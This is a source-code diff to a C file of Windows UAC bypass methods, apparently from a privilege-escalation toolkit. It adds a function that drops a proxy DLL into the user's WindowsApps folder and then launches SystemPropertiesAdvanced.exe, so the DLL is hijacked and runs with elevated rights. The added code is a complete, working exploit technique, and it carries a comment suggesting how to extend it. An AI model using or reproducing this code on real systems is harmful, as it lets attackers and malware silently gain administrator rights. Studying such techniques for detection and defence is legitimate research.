@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2018
+*  (C) COPYRIGHT AUTHORS, 2015 - 2019
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.13
 *
-*  DATE:        04 Dec 2018
+*  DATE:        25 Jan 2019
 *
 *  Hybrid UAC bypass methods.
 *
@@ -3130,4 +3130,65 @@ BOOL ucmAcCplAdminMethod(
         CoUninitialize();
 
     return SUCCEEDED(hr);
+}
+
+/*
+* ucmEgre55Method
+*
+* Purpose:
+*
+* Bypass UAC by DLL hijack of SystemProperties* commands.
+* Original author link: https://egre55.github.io/system-properties-uac-bypass/
+*
+* Note: 
+*
+* This code expects to work under wow64 only because of uacme restrictions.
+* However you can extent it to force drop your *32* bit dll from your *64* bit application.
+*
+*/
+BOOL ucmEgre55Method(
+    _In_ PVOID ProxyDll,
+    _In_ DWORD ProxyDllSize
+)
+{
+    BOOL bResult = FALSE;
+    PWSTR pTmp = NULL, lpDest = NULL;
+
+    SIZE_T Length;
+
+    WCHAR szBuffer[MAX_PATH * 2];
+
+    do {
+
+        if (FAILED(SHGetKnownFolderPath(&FOLDERID_LocalAppData, KF_FLAG_DEFAULT, NULL, (PWSTR*)&pTmp)))
+            break;
+
+        Length = _strlen(pTmp);
+        if (Length == 0)
+            break;
+
+        Length = (MAX_PATH + Length) * sizeof(WCHAR);
+        lpDest = (PWSTR)supHeapAlloc(Length);
+        if (lpDest == NULL)
+            break;
+
+        _strcpy(lpDest, pTmp);
+        _strcat(lpDest, TEXT("\\Microsoft\\WindowsApps\\"));
+        _strcat(lpDest, SRRSTR_DLL);
+
+        if (!supWriteBufferToFile(lpDest, ProxyDll, ProxyDllSize))
+            break;
+
+        _strcpy(szBuffer, g_ctx->szSystemDirectory);
+        _strcat(szBuffer, SYSTEMROPERTIESADVANCED_EXE);
+        bResult = supRunProcess(szBuffer, NULL);
+
+        DeleteFile(lpDest);
+
+    } while (FALSE);
+
+    if (pTmp) CoTaskMemFree((LPVOID)pTmp);
+    if (lpDest) supHeapFree(lpDest);
+
+    return bResult;
 }
